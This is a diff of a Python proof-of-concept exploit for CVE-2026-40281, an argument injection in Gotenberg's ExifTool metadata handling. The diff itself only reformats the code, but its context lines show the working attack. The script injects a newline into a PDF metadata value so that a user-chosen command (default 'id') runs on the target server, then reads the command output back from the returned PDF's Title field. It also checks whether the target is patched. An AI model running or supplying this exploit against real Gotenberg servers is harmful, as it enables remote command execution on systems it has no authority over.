@@ -11,6 +11,7 @@ Usage: python3 poc.py -u http://your-ip:3000 -c id    # send the requests
        python3 poc.py -u http://your-ip:3000 -c id -v # print returned PDF
        python3 poc.py -o poc.pdf -c id                # generate + print curl
 """
+
 import argparse
 import io
 import json
@@ -130,15 +131,21 @@ def exploit(url: str, command: str, verbose: bool = False):
         "poc.pdf",
     )
     if status == 400:
-        die("the target rejected the newline in the metadata value (HTTP 400), it looks patched (>= 8.31.0)")
+        die(
+            "the target rejected the newline in the metadata value (HTTP 400), it looks patched (>= 8.31.0)"
+        )
     if status != 200:
-        die(f"metadata write failed with HTTP {status}: {returned_pdf.decode(errors='replace').strip()}")
+        die(
+            f"metadata write failed with HTTP {status}: {returned_pdf.decode(errors='replace').strip()}"
+        )
     print("[+] Metadata written (HTTP 200), reading back the Title of the returned PDF")
     status, body = post_multipart(
         url.rstrip("/") + READ_PATH, None, returned_pdf, "rce.pdf"
     )
     if status != 200:
-        die(f"metadata read failed with HTTP {status}: {body.decode(errors='replace').strip()}")
+        die(
+            f"metadata read failed with HTTP {status}: {body.decode(errors='replace').strip()}"
+        )
     title = next(iter(json.loads(body).values())).get("Title", "")
     print("[+] Command output:")
     print(f"    {title.strip()}")
@@ -152,20 +159,26 @@ def parse_args():
         description="CVE-2026-40281 - PoC for the Gotenberg ExifTool argument injection",
     )
     parser.add_argument(
-        "-c", "--command", default="id",
+        "-c",
+        "--command",
+        default="id",
         help="command to execute on the target (default: %(default)s)",
     )
     parser.add_argument(
-        "-v", "--verbose", action="store_true",
+        "-v",
+        "--verbose",
+        action="store_true",
         help="print the returned PDF with non-printable bytes replaced by dots",
     )
     group = parser.add_mutually_exclusive_group()
     group.add_argument(
-        "-u", "--url",
+        "-u",
+        "--url",
         help=f"send the requests to this Gotenberg URL, e.g. {DEFAULT_URL}",
     )
     group.add_argument(
-        "-o", "--output",
+        "-o",
+        "--output",
         help="only write the PoC PDF to this path and print the equivalent curl commands",
     )
     args = parser.parse_args()
